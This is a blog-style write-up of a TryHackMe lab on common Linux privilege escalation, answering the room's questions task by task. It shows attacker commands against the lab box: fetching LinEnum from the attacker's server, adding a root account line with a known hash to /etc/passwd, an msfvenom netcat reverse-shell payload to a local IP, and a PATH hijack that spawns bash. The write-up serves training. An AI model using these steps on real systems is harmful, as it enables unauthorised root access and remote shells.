---
layout: post
title: Write-Up [THM] Common Linux Privesc
categories: [Write-Ups, TryHackMe]
tags: [TryHackMe, Linux, Bash, Privilege Escalation]
featured-image:  thm/linux-privesc/theme.png
featured-image-alt: Common Linux privesc
---

It's a write-up about the room : [Try Hack Me - Room : Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)

# [Task 1] Get Connected

> This room will explore common Linux Privilege Escalation vulnerabilities and techniques, but in order to do that, we'll need to do a few things first!

A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room.

We deploy the instance. 

# [Task 2] Understanding Privesc

![Task 2](/assets/img/thm/linux-privesc/task-2.png)

# [Task 3] Enumeration

![Task 3](/assets/img/thm/linux-privesc/task-3.png)

# [Task 4] - Enumeration

* First, let's SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.
So, `ssh user3@IP_MACHINE` with the password `password`.

* What is the target's hostname?  

We o `hostname` to know the name of the machine. The answer is **polobox**.

* Look at the output of /etc/passwd how many "user[x]" are there on the system?  

We use the command `cat /etc/passwd | grep user` and find **8** users.

* How many available shells are there on the system? 

We download a local copy of LinEnum from [Linenum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh). After that, we start a Python web server to get LinEnum on the target machine with :  

> Using Python 2: python2 -m SimpleHTTPServer   
> Using Python 3: python -m http.server

We get the LinEnum bash file using the command : `wget http://VPN_ADRESS:8000/LinEnum.sh`.  

We find the VPN_ADRESS corresponding to `utun` on the ouptut of the command `ifconfig` on the local machine.  

Make the file executable using the command `chmod +x LinEnum.sh` on the target machine, and execute this one : `./LinEnum.sh`. The output reveals to us : 

```
[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```
So, there are **4** available shells on the system.

* What is the name of the bash script that is set to run every 5 minutes by cron? 

We search the bash script in the crontab : `cat /etc/crontab`.   
There is this line : `*/5  *    * * * root    /home/user4/Desktop/autoscript.sh`.  
Therefore, the name of the bash script thait is set to run every 5 minutes by cron is **autoscript.sh**. 

* What critical file has had its permissions changed to allow some users to write to it?

The file is **/etc/passwd**.

**Other file** : `linepeas.sh` available on this website [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

# [Task 5] - Abusing SUID/GUID Files

* What is the path of the file in user3's directory that stands out to you?

We use `pwd` and `ls` to know the path of the shell. We find **/home/user3/shell**.
After that we execute the binary `./shell`.

Synbollically : find / -perm -u=s -type f 2>/dev/null  
Numerically : find / -perm -4000 -type f 2>/dev/null


# [Task 6] - Exploiting Writeable /etc/passwd

We swap to user7 with `su user7` and the password `password`.  

* Having read the information above, what direction privilege escalation is this attack?

The direction privilege escalation is **vertical**.

* Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]". What is the hash created by using this command with the salt, "new" and the password "123"?

First, go to the home directory of the user7 : `cd /home/user7`.  
After that, we use : `openssl passwd -1 -salt new 123` and find the hash **$1$new$p7ptkEKU1HnaHpRtzNizS1**.

* Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

We create a new root user account with vi : `vi /etc/passwd` and we add this line :  
`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`.

The answer is `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`.

# [Task 7] - Escaping Vi Editor

We swap to user8 with `su user8` and the password `password`.  

* Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root? `NOPASSWD`

# [Task 8] - Exploiting Crontab

We swap to user4 with `su user4` and the password `password`.  

* What is the flag to specify a payload in msfvenom? `-p`

We create a payload using: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`. 

* What directory is the "autoscript.sh" under? `/home/user4/Desktop`

# [Task 9] - Exploiting PATH Variable

We swap to user5 with `su user5` and the password `password`.  

* Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?   

We execute the binary `./shell` and this one do the same as **ls** command.

* Now we're inside tmp, let's create an imitation executable. The format for what we want to do is: echo "[whatever command we want to run]" > [name of the executable we're imitating]
What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating. `echo "/bin/bash" > ls`

* Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this? `chmod +x ls`